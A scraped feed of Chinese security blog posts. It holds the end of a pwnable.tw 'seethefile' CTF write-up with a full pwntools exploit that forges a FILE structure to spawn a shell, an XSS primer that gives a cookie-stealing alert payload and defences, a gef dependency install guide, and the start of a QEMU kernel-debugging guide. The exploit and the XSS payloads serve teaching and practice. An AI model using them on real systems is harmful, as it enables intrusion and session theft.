_IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 然后了解一下为什么可以利用fclose函数： 12345678910111213141516171819202122232425262728293031323334353637383940int_IO_new_fclose (FILE *fp)&#123; int status; CHECK_FILE(fp, EOF);#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1) /* We desperately try to help programs which are using streams in a strange way and mix old and new functions. Detect old streams here. */ if (_IO_vtable_offset (fp) != 0) return _IO_old_fclose (fp);#endif /* First unlink the stream. */ if (fp-&gt;_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); _IO_acquire_lock (fp); if (fp-&gt;_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0; _IO_release_lock (fp); _IO_FINISH (fp); if (fp-&gt;_mode &gt; 0) &#123; /* This stream has a wide orientation. This means we have to free the conversion functions. */ struct _IO_codecvt *cc = fp-&gt;_codecvt; __libc_lock_lock (__gconv_lock); __gconv_release_step (cc-&gt;__cd_in.__cd.__steps); __gconv_release_step (cc-&gt;__cd_out.__cd.__steps); __libc_lock_unlock (__gconv_lock); &#125; else &#123; if (_IO_have_backup (fp)) _IO_free_backup_area (fp); &#125; _IO_deallocate_file (fp); return status;&#125; 通过gdb调试一下，在_IO_new_fclose处下断点： 12345678 0xf76579da: xchg ax,ax 0xf76579dc: xchg ax,ax 0xf76579de: xchg ax,ax=&gt; 0xf76579e0 &lt;_IO_new_fclose&gt;: push ebp 0xf76579e1 &lt;_IO_new_fclose+1&gt;: mov ebp,esp 0xf76579e3 &lt;_IO_new_fclose+3&gt;: push edi 0xf76579e4 &lt;_IO_new_fclose+4&gt;: push esi 0xf76579e5 &lt;_IO_new_fclose+5&gt;: push ebx 接下来一直运行到_IO_new_fclose+132处，调用了_IO_new_file_close_it： 12345678 0xf7657a5e &lt;_IO_new_fclose+126&gt;: je 0xf7657aa8 &lt;_IO_new_fclose+200&gt; 0xf7657a60 &lt;_IO_new_fclose+128&gt;: sub esp,0xc 0xf7657a63 &lt;_IO_new_fclose+131&gt;: push esi=&gt; 0xf7657a64 &lt;_IO_new_fclose+132&gt;: call 0xf7663810 &lt;_IO_new_file_close_it&gt; 0xf7657a69 &lt;_IO_new_fclose+137&gt;: mov edx,DWORD PTR [esi] 0xf7657a6b &lt;_IO_new_fclose+139&gt;: add esp,0x10 0xf7657a6e &lt;_IO_new_fclose+142&gt;: mov edi,eax 0xf7657a70 &lt;_IO_new_fclose+144&gt;: and edx,0x8000 最后call [eax+0x44]，发现这时eax即为vtable的地址，而0x44则为_IO_file_close的偏移： 12345678 0xf7663914 &lt;_IO_new_file_close_it+260&gt;: sub esp,0xc 0xf7663917 &lt;_IO_new_file_close_it+263&gt;: mov eax,DWORD PTR [ebx+eax*1+0x94] 0xf766391e &lt;_IO_new_file_close_it+270&gt;: push ebx=&gt; 0xf766391f &lt;_IO_new_file_close_it+271&gt;: call DWORD PTR [eax+0x44] 0xf7663922 &lt;_IO_new_file_close_it+274&gt;: add esp,0x10 0xf7663925 &lt;_IO_new_file_close_it+277&gt;: mov esi,eax 0xf7663927 &lt;_IO_new_file_close_it+279&gt;: jmp 0xf766384f &lt;_IO_new_file_close_it+63&gt; 0xf766392c &lt;_IO_new_file_close_it+284&gt;: lea esi,[esi+eiz*1+0x0] Analysis1234567root@595b467648a0:~/tmp# checksec ./seethefile[*] '/root/tmp/seethefile' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 先用keypatch把alarm给 patch 掉，方便用gdb调试： 1234567891011121314151617181920212223242526272829303132.text:0804870B public init.text:0804870B init proc near ; CODE XREF: main+1C↓p.text:0804870B ; __unwind &#123;.text:0804870B push ebp.text:0804870C mov ebp, esp.text:0804870E sub esp, 8.text:08048711 mov eax, ds:stdout@@GLIBC_2_0.text:08048716 push 0 ; n.text:08048718 push 2 ; modes.text:0804871A push 0 ; buf.text:0804871C push eax ; stream.text:0804871D call _setvbuf.text:08048722 add esp, 10h.text:08048725 sub esp, 8.text:08048728 push offset handler ; handler.text:0804872D push 0Eh ; sig.text:0804872F call _signal.text:08048734 add esp, 10h.text:08048737 sub esp, 0Ch.text:0804873A nop.text:0804873B nop.text:0804873C nop.text:0804873D nop.text:0804873E nop.text:0804873F nop.text:08048740 nop.text:08048741 add esp, 10h.text:08048744 nop.text:08048745 leave.text:08048746 retn.text:08048746 ; &#125; // starts at 804870B.text:08048746 init endp 可以看到是个菜单： 1234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main(int argc, const char **argv, const char **envp)&#123; char nptr; // [esp+Ch] [ebp-2Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); init(); welcome(); while ( 1 ) &#123; menu(); __isoc99_scanf(\"%s\", &amp;nptr); switch ( atoi(&amp;nptr) ) &#123; case 1: openfile(); break; case 2: readfile(); break; case 3: writefile(); break; case 4: closefile(); break; case 5: printf(\"Leave your name :\"); __isoc99_scanf(\"%s\", &amp;name); printf(\"Thank you %s ,see you next time\\n\", &amp;name); if ( fp ) fclose(fp); exit(0); return; default: puts(\"Invaild choice\"); exit(0); return; &#125; &#125;&#125; readfile里有一个magicbuf，可以读0x18F个字节，很可能有溢出： 123456789101112int readfile()&#123; int result; // eax memset(magicbuf, 0, 0x190u); if ( !fp ) return puts(\"You need to open a file first\"); result = fread(magicbuf, 0x18Fu, 1u, fp); if ( result ) result = puts(\"Read Successful\"); return result;&#125; 发现在.bss段上可以用magicbuf把fp指针盖掉： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.bss:0804B0C0 public magicbuf.bss:0804B0C0 ; char magicbuf[416].bss:0804B0C0 magicbuf db 1A0h dup(?) ; DATA XREF: openfile+33↑o.bss:0804B0C0 ; readfile+17↑o ....bss:0804B260 public name.bss:0804B260 name db ? ; ; DATA XREF: main+9F↑o.bss:0804B260 ; main+B4↑o.bss:0804B261 db ? ;.bss:0804B262 db ? ;.bss:0804B263 db ? ;.bss:0804B264 db ? ;.bss:0804B265 db ? ;.bss:0804B266 db ? ;.bss:0804B267 db ? ;.bss:0804B268 db ? ;.bss:0804B269 db ? ;.bss:0804B26A db ? ;.bss:0804B26B db ? ;.bss:0804B26C db ? ;.bss:0804B26D db ? ;.bss:0804B26E db ? ;.bss:0804B26F db ? ;.bss:0804B270 db ? ;.bss:0804B271 db ? ;.bss:0804B272 db ? ;.bss:0804B273 db ? ;.bss:0804B274 db ? ;.bss:0804B275 db ? ;.bss:0804B276 db ? ;.bss:0804B277 db ? ;.bss:0804B278 db ? ;.bss:0804B279 db ? ;.bss:0804B27A db ? ;.bss:0804B27B db ? ;.bss:0804B27C db ? ;.bss:0804B27D db ? ;.bss:0804B27E db ? ;.bss:0804B27F db ? ;.bss:0804B280 public fp.bss:0804B280 ; FILE *fp.bss:0804B280 fp dd ? ; DATA XREF: openfile+6↑r.bss:0804B280 ; openfile+AD↑w ....bss:0804B280 _bss ends.bss:0804B280 同时程序的功能是可以读取文件内容，我们可以通过读取/proc/self/maps来获得libc的地址。 我们所需要做的就是伪造一个文件结构，然后将地址赋予给fp： 找到一个buf1，使得buf1+0x94为_IO_file_jumps结构，同时要注意_vtable_offset要为0，其偏移为0x46且只占一个字节 找到一个buf2，使得buf2+0x44为fclose的地址 最后，写入name覆盖fp到buf Exploit打通了之后发现无法cat flag，在/home/seethefile/下可以看到一个get_flag.c的源文件： 123456789101112131415161718192021222324252627282930313233#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int read_input(char *buf,unsigned int size)&#123; int ret ; ret = read(0,buf,size); if(ret &lt;= 0)&#123; puts(\"read error\"); exit(1); &#125; if(buf[ret-1] == '\\n') buf[ret-1] = '\\x00'; return ret ;&#125;int main()&#123; char buf[100]; setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); printf(\"Your magic :\"); read_input(buf,40); if(strcmp(buf,\"Give me the flag\"))&#123; puts(\"GG !\"); return 1; &#125; FILE *fp = fopen(\"/home/seethefile/flag\",\"r\"); if(!fp)&#123; puts(\"Open failed !\"); &#125; fread(buf,1,40,fp); printf(\"Here is your flag: %s \\n\",buf); fclose(fp);&#125; 完整的 Exploit： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'local = 0if local: p = process('./seethefile') libc = ELF('./libc.so.6')else: p = remote('chall.pwnable.tw', 10200) libc = ELF('./libc_32.so.6')elf = ELF('./seethefile')offset = 0x280 - 0x0C0# gdb.attach(p, 'b *_IO_new_fclose')def cmd(c): p.recvuntil('choice :') p.sendline(str(c))def openfile(filename): cmd(1) p.recvuntil('see :') p.sendline(filename)def readfile(): cmd(2)def writefile(): cmd(3)def closefile(): cmd(4)def exit(name): cmd(5) p.recvuntil('name :') p.sendline(name)openfile('/proc/self/maps')readfile()readfile()writefile()data = p.recvuntil('r-xp')if local: libc_base = int(data.split('-')[0].split('\\n')[1], 16)else: libc_base = int(data.split('-')[-3].split('\\n')[1], 16)info('libc_base = ' + hex(libc_base))buf = 0x0804B260system = libc_base + libc.symbols['system']payload = '/bin/sh'.ljust(0x20, '\\x00')payload += p32(buf)payload = payload.ljust(0x48, '\\x00')payload += p32(buf + 0x10)payload = payload.ljust(0x94, '\\x00')payload += p32(0x804b2f8 - 0x44)payload += p32(system)exit(payload)p.sendline(\"./home/seethefile/get_flag\")p.recvuntil(\"magic :\")p.sendline(\"Give me the flag\\x00\")p.interactive() 修改后的_IO_FILE结构体： 1234567891011121314151617181920212223242526272829303132333435assassinq&gt;&gt; p *((struct _IO_FILE_plus *)0x804B260)$30 = &#123; file = &#123; _flags = 0x6e69622f, _IO_read_ptr = 0x68732f &lt;error: Cannot access memory at address 0x68732f&gt;, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_end = 0xf75f9700 &quot;&quot;, _IO_buf_base = 0x0, _IO_buf_end = 0x804b260 &lt;name&gt; &quot;/bin/sh&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x804b270 &lt;name+16&gt;, _offset = 0x0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &apos;\\000&apos; &lt;repeats 39 times&gt; &#125;, vtable = 0x804b2b4&#125; 修改后的vtable： 123456789101112131415161718192021222324assassinq&gt;&gt; p *((struct _IO_jump_t *)0x804B2B4)$31 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x0, __overflow = 0x0, __underflow = 0x0, __uflow = 0x0, __pbackfail = 0x0, __xsputn = 0x0, __xsgetn = 0x0, __seekoff = 0x0, __seekpos = 0x0, __setbuf = 0x0, __sync = 0x0, __doallocate = 0x0, __read = 0x0, __write = 0x0, __seek = 0x804b2b4, __close = 0xf7634da0 &lt;__libc_system&gt;, __stat = 0x0, __showmanyc = 0x0, __imbue = 0x0&#125; Referenceshttps://yuuoniy.github.io/2018/08/14/seethefile-writeup/http://blog.eonew.cn/archives/1123http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"初探跨站脚本攻击（Cross-Site Scripting）","slug":"初探跨站脚本攻击（Cross-Site-Scripting）","date":"2019-08-12T01:13:17.000Z","updated":"2019-08-26T05:45:50.878Z","comments":true,"path":"2019/08/12/初探跨站脚本攻击（Cross-Site-Scripting）/","link":"","permalink":"blog.b3ale.cn/2019/08/12/初探跨站脚本攻击（Cross-Site-Scripting）/","excerpt":"最近在做渗透测试，需要接触一些 WEB 方面的基础知识。","text":"最近在做渗透测试，需要接触一些 WEB 方面的基础知识。 IntroXSS 全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为 XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的 web 安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。 注入点： GET 请求参数 POST 请求参数 UA（User Agent） Referer URL … 总共分成三类，存储型 XSS（Stored XSS）、反射型 XSS（Reflected XSS）和DOM-based XSS。几种攻击方式的图解可以参考绿盟的这篇文章，三种 XSS 可以参考这篇文章在本地测试 存储型 XSS也叫持久型 XSS，那些将恶意脚本永久的保存在目标服务器上的攻击方式，如存储在数据库、消息论坛、访问日志、评论内容扥等。Payload 是有经过存储的，当一个页面存在存储型 XSS 的时候，XSS 注入成功后，那么每次访问该页面都将触发 XSS。 Examplehttp://www.secist.com/archives/5388.html 反射型 XSS也叫非持久型 XSS，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。最常见的是 Payload 是构造在网址的某个 GET 参数的值里。 Examplehttps://blog.csdn.net/binyao02123202/article/details/9041113 DOM-Based 型 XSS攻击者利用原生 JavaScript 代码篡改客户端的 DOM 结构，导致用户操作执行了“意外”的动作。 Example12345678910111213141516Select your language:&lt;select &gt;&lt;script&gt; document.write( \"&lt;OPTION value=1&gt;\" + document.location.href.substring( document.location.href.indexOf(\"default=\") + 8 ) + \"&lt;/OPTION&gt;\" ); document.write(\"&lt;OPTION value=2&gt;English&lt;/OPTION&gt;\"); &lt;/script&gt;&lt;/select&gt;… 网站 URL 则为这个样子： 1http://www.some.site/page.html?default=French 利用这个页面 DOM 结构的漏洞，向受害者发送下面的链接，点开这个链接就会将用户的 cookie 全部 alert 出来了： 1http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt; How to TestWhere 直接插入到script标签里 插入到html注释里 插入到html标签的属性名里 插入到html标签的属性值里 作为html标签的名字 直接插入到css里 Manually 参数中提交xss payload代码 在所有可以提交参数并能在页面返回的位置上 url的每一个参数 url本身 表单 搜索框 … Usual Scene 重灾区——评论区、留言区、个人信息、订单信息等 针对型——站内信、网页即时通讯、私信、意见反馈等 存在风险——搜索框、当前目录、图片属性等 Payloadshttps://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txthttps://github.com/ismailtasdelen/xss-payload-list How to AvoidBasic不要把不受信任的数据插入到原本允许 JavaScript 可以放置的地方 &lt;script&gt;...永远不要把不受信任的数据放在这...&lt;/script&gt;：直接放在 script 标签内 &lt;!--...永远不要把不受信任的数据放在这...--&gt;：放在 HTML 注释内 &lt;div ...永远不要把不受信任的数据放在这...=test /&gt;：做为一个属性名 &lt;永远不要把不受信任的数据放在这... href=&quot;/test&quot; /&gt;：做为一个标签名 &lt;style&gt;...永远不要把不受信任的数据放在这...&lt;/style&gt;：直接放在 style 标签内复制代码原则 1——在向元素中插入不受信任的 HTML 代码之前一定要进行转义 在向元素中插入不受信任的 HTML 代码之前一定要进行转义 &lt;body&gt;...将不受信任的数据转义后再放在这...&lt;/body&gt; &lt;div&gt;...将不受信任的数据转义后再放在这...&lt;/div&gt; … 常用的转义规则如下： 字符 转义后的字符 &amp; &amp;amp; &lt; &amp;lt; &gt; &amp;gt; &quot; &amp;quot; &#39; &amp;#x27; / &amp;#x2F; 向元素的属性插入不受信任的 HTML 代码之前一定要进行转义 &lt;div attr=...将不受信任的数据转义后再放在这...&gt;content&lt;/div&gt;：在没有加引号的属性值内 &lt;div attr=&#39;...将不受信任的数据转义后再放在这...&#39;&gt;content&lt;/div&gt;：在加了单引号的属性值内 &lt;div attr=&quot;...将不受信任的数据转义后再放在这...&quot;&gt;content&lt;/div&gt;：在加了双引号的属性值内 用不受信任的数据向 JavaScript 代码赋值前，一定要进行转义 &lt;script&gt;alert(&#39;...将不受信任的数据转义后再放在这...&#39;)&lt;/script&gt;：在一个字符串之内 &lt;script&gt;x=&#39;...将不受信任的数据转义后再放在这...&#39;&lt;/script&gt;：在表达式的一侧 &lt;div onmouseover=&quot;x=&#39;...将不受信任的数据转义后再放在这...&#39;&quot;&lt;/div&gt;：在事件处理函数内 有一些 JavaScript 函数永远无法安全的使用不受信任的数据作为输入： 123&lt;script&gt; window.setInterval(\"即使你做了转义，但是仍然可能被XSS攻击\");&lt;/script&gt; 在 HTML 的上下文中对 JSON 值进行转义，并用 JSON.parse()方法来读取值一定要确保http response中的头部信息的content-type为application/json，而不是text/html，因为那样的话，很可能会被人利用进行 XSS 攻击： 1234567891011HTTP/1.1 200Date: Wed, 06 Feb 2013 10:28:54 GMTServer: Microsoft-IIS/7.5....Content-Type: text/html; charset=utf-8 &lt;-- bad...Content-Length: 373Keep-Alive: timeout=5, max=100Connection: Keep-Alive&#123;&quot;Message&quot;:&quot;No HTTP resource was found that matches the request URI &apos;dev.net.ie/api/pay/.html?HouseNumber=9&amp;AddressLine=The+Gardens&lt;script&gt;alert(1)&lt;/script&gt;&amp;AddressLine2=foxlodge+woods&amp;TownName=Meath&apos;.&quot;,&quot;MessageDetail&quot;:&quot;No type was foundthat matches the controller named &apos;pay&apos;.&quot;&#125; &lt;-- 这里script标签有可能会被执行 使用application/json就不会被利用： 12345HTTP/1.1 200Date: Wed, 06 Feb 2013 10:28:54 GMTServer: Microsoft-IIS/7.5....Content-Type: application/json; charset=utf-8 &lt;--good... 将不受信任的数据作为 CSS 属性插入到文档之前一定要进行转义 &lt;style&gt;selector { property : ...将不受信任的数据转义后再放在这...; } &lt;/style&gt;：属性值 &lt;style&gt;selector { property : &quot;...将不受信任的数据转义后再放在这...&quot;; } &lt;/style&gt;：属性值 &lt;span style=&quot;property : ...将不受信任的数据转义后再放在这...&quot;&gt;text&lt;/span&gt;：属性值 有一些css属性值对于不受信任的数据是无法确保万无一失的——即使做了转义，如下面的两个css属性： 123456 &#123; background-url: \"javascript:alert(1)\";&#125; &#123; text-size: \"expression(alert('XSS'))\";&#125; // only in IE 应该确保所有 CSS 属性值引入的外部链接是由http开头的，而不是javascript开头的 向 HTML 的 URL 参数插入将不受信任的数据前，一定要将进行转义123&lt;a href=\"http://www.somesite.com?test=...将不受信任的数据转义后再放在这...\"&gt; link&lt;/a&gt; Better对于 cookie 使用 httpOnly 标识使用httpOnly标识后的cookie JavaScript是无法获取的，又由于cookie是基于同源原则，所以一定程度上会防范那些利用客户cookie的XSS攻击。 在 http header 中使用 Content Security Policy利用http header中的属性值Content-Security-Policy来防范XSS。HTTP响应头中Content-Security-Policy允许站点管理者在指定的页面控制用户代理的资源。除了少数例外，这条政策将极大地指定服务源以及脚本端点。 使用自动转义模板系统许多 Web 应用程序框架提供了自动的上下文转义功能，如AngularJS严格的上下文转义和Go模板。尽可能使用这些技术。 在 http header 中使用 X-XXS-Protectionhttp header中X-XSS-Protection响应头是Internet Explorer、Chrome和Safari的一个功能，当检测到跨站脚本攻击时，浏览器将停止加载页面。虽然这些保护在现代浏览器中基本上是不必要的，当网站实施一个强大的Content-Security-Policy来禁用内联的JavaScript (&#39;unsafe-inline&#39;)时, 他们仍然可以为尚不支持CSP的旧版浏览器的用户提供保护。 Games alert(1) to win —&gt; alert(1) to win payloads prompt(1) to win —&gt; XSSChallengeWiki - prompt.ml XSS game area —&gt; 玩转 Google 的 XSS 游戏 XSS Challenges —&gt; Solutions to the wargame XSS Challenges Advanced 如何防止 XSS 攻击 XSS with length restriction XSS 过滤绕过速查表 XSS 攻击进阶篇——那些年我们看不懂的 XSS XSS 攻击冷门花样玩法总结 戏耍 XSS 的一些技巧 Bypass xss 过滤的测试方法 Referenceshttps://juejin.im/post/5bcc9487518825780e6eaf12https://www.fooying.com/the-art-of-xss-1-introduction/http://blog.nsfocus.net/xss-start-finish/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"解决gef missing问题","slug":"解决gef-missing问题","date":"2019-08-11T08:50:36.000Z","updated":"2019-09-07T13:28:47.787Z","comments":true,"path":"2019/08/11/解决gef-missing问题/","link":"","permalink":"blog.b3ale.cn/2019/08/11/解决gef-missing问题/","excerpt":"用 gdb 插件 gef 需要安装一些额外的东西才能使用所有的功能，不然每次启动 gdb 都会提示 gef missing ，强迫症决定把他都搞定。","text":"用 gdb 插件 gef 需要安装一些额外的东西才能使用所有的功能，不然每次启动 gdb 都会提示 gef missing ，强迫症决定把他都搞定。 Environment1234567891011121314151617181920212223242526272829303132➜ ~ uname -aLinux ubuntu 4.4.0-92-generic #115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux➜ ~ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 16.04.6 LTSRelease: 16.04Codename: xenial➜ ~ gdbGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\".GEF for linux ready, type `gef' to start, `gef config' to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5gef➤ gef missing[*] Command `assemble` is missing, reason → Missing `keystone-engine` package for Python3, install with: `pip3 install keystone-engine`.[*] Command `ropper` is missing, reason → Missing `ropper` package for Python3, install with: `pip3 install ropper`.[*] Command `unicorn-emulate` is missing, reason → Missing `unicorn` package for Python3. Install with `pip3 install unicorn`.[*] Command `set-permission` is missing, reason → Missing `keystone-engine` package for Python3, install with: `pip3 install keystone-engine`.[*] Command `capstone-disassemble` is missing, reason → Missing `capstone` package for Python3. Install with `pip3 install capstone`.gef➤ Step One第一步先尝试用 pip 安装所有的依赖包： 1➜ ~ pip3 install --user unicorn keystone-engine ropper capstone -i https://pypi.tuna.tsinghua.edu.cn/simple 结果发现 ropper 安装失败了 Step Tworopper 安装失败的主要原因是 filebytes 这个包装不好： 1234567891011121314151617181920➜ ~ pip3 install --user ropperCollecting ropperCollecting filebytes&gt;=0.9.18 (from ropper)ERROR: ropper 1.12.1 requires filebytes&gt;=0.9.18, which is not installed.Installing collected packages: filebytes, ropperERROR: Exception:Traceback (most recent call last): File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/cli/base_command.py\", line 178, in main status = self.run(options, args) File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/commands/install.py\", line 414, in run use_user_site=options.use_user_site, File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/__init__.py\", line 58, in install_given_reqs **kwargs File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/req_install.py\", line 920, in install use_user_site=use_user_site, pycompile=pycompile, File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/req_install.py\", line 448, in move_wheel_files warn_script_location=warn_script_location, File \"/usr/local/lib/python3.5/dist-packages/pip/_internal/wheel.py\", line 428, in move_wheel_files assert info_dir, \"%s .dist-info directory not found\" % reqAssertionError: filebytes&gt;=0.9.18 .dist-info directory not found 于是尝试用源码安装： 123456➜ ~ git clone https://github.com/sashs/filebytes.git➜ ~ cd filebytes➜ ~ sudo python3 setup.py install➜ ~ git clone https://github.com/sashs/ropper.git➜ ~ cd ropper➜ ~ sudo python3 setup.py install Step Three接下来 keystone 报错了： 1234567891011121314151617181920➜ ~ gdbGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\".GEF for linux ready, type `gef' to start, `gef config' to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5gef➤ gef missing[*] module 'keystone' has no attribute 'KS_ARCH_X86'gef➤ Google 了一下找到的方法也是用源码来装： 123456789➜ ~ wget https://github.com/keystone-engine/keystone/archive/0.9.1.tar.gz➜ ~ tar xzvf 0.9.1.tar.gz➜ ~ cd keystone-0.9.1/➜ ~ mkdir build➜ ~ cd build➜ ~ ../make-share.sh➜ ~ sudo make install➜ ~ sudo ldconfig➜ ~ kstool 然后再重新装一下 ropper： 1➜ ~ pip3 install --user ropper -i https://pypi.tuna.tsinghua.edu.cn/simple Another Way转自m6m wiki。 12sudo apt update &amp;&amp; sudo apt install -y build-essential python3 python3-dev python3-pip gdb libcapstone3 libcapstone-dev cmakesudo -H pip3 install unicorn capstone filebytes 接下来按照之前的方法安装一下 keystone。最后安装 ropper。 1sudo -H pip3 install ropper Finally终于没有报gef missing了： 1234567891011121314151617181920➜ ~ gdbGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\".GEF for linux ready, type `gef' to start, `gef config' to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5gef➤ gef missing[+] No missing commandgef➤ Referenceshttps://wiki.m6m.dev/ctf/gdb/gef/missing","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"blog.b3ale.cn/tags/solution/"}]},{"title":"使用QEMU+gdb对Linux Kernel进行调试","slug":"使用QEMU-gdb对Linux-Kernel进行调试","date":"2019-08-08T01:02:12.000Z","updated":"2019-11-29T08:13:24.574Z","comments":true,"path":"2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/","link":"","permalink":"blog.b3ale.cn/2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/","excerpt":"最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。","text":"最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。 Environment12345678➜ ~ uname -aLinux ubuntu 4.4.0-92-generic #115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux➜ ~ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 16.04.6 LTSRelease: 16.04Codename: xenial 使用Ubuntu 16.04，因为该发行版默认已经开启了内核调试支持： 12345678910➜ ~ cat /boot/config-4.4.0-92-generic | grep \"GDB\"# CONFIG_CFG80211_INTERNAL_REGDB is not setCONFIG_SERIAL_KGDB_NMI=yCONFIG_GDB_SCRIPTS=yCONFIG_HAVE_ARCH_KGDB=yCONFIG_KGDB=yCONFIG_KGDB_SERIAL_CONSOLE=y# CONFIG_KGDB_TESTS is not setCONFIG_KGDB_LOW_LEVEL_TRAP=yCONFIG_KGDB_KDB=y PreparationSymbolic Files首先准备调试需要的符号文件。看一下该版本的Codename： 12➜ ~ lsb_release -cCodename: xenial 然后新建文件ddebs.list，其内容如下（看情况修改Codename）： 12345➜ ~ cat /etc/apt/sources.list.d/ddebs.listdeb http://ddebs.ubuntu.com/ xenial main restricted universe multiversedeb http://ddebs.ubuntu.com/ xenial-security main restricted universe multiversedeb http://ddebs.ubuntu.com/ xenial-updates main restricted universe multiversedeb http://ddebs.ubuntu.com/ xenial-proposed main restricted universe multiverse http://ddebs.ubuntu.com是Ubuntu的符号服务器。执行下面的命令添加密钥，然后就可以更新并下载符号文件了： 12345➜ ~ wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -➜ ~ sudo apt-get update➜ ~ uname -r4.4.0-92-generic➜ ~ sudo apt-get install linux-image-4.13.0-38-generic-dbgsym 完成后，符号文件将会放在下面的目录下： 12➜ ~ file /usr/lib/debug/boot/vmlinux-4.4.0-92-generic/usr/lib/debug/boot/vmlinux-4.4.0-92-generic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=a57bd034055907e83dfd68d2999f976285d2ab31, not stripped 可以看到这是一个静态链接的可执行文件，用gdb可以进行调试，像这样： 1234567891011121314151617181920212223242526272829➜ ~ gdb -q /usr/lib/debug/boot/vmlinux-4.4.0-92-genericGEF for linux ready, type `gef' to start, `gef config' to configure79 commands loaded for GDB 7.11.1 using Python engine 3.5[*] 1 command could not be loaded, run `gef missing` to know why.Reading 